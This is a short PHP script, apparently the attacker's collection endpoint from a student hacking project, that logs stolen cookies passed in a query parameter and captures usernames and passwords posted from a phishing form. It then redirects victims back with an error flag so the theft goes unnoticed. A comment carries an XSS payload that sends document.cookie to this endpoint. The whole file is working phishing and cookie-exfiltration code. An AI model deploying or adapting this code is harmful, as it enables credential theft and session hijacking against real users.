<?php
if (isset($_GET['c'])) {
  file_put_contents('/var/log/apache2/log.txt', $_GET['c'] . "\n", FILE_APPEND);
}

if (isset($_POST['username'], $_POST['password'])) {
  $log = 'Username: ' . $_POST['username'] . ' - Password: ' . $_POST['password'];
  file_put_contents('/var/log/apache2/log.txt', $log . "\n", FILE_APPEND);
  header('Location: ' . $_SERVER['HTTP_REFERER'] . '?error=1', TRUE, 302);
  exit;
}
// <script>fetch('http://localhost:3000/PBL4/Hacker/log.php?c=' + document.cookie)</script>
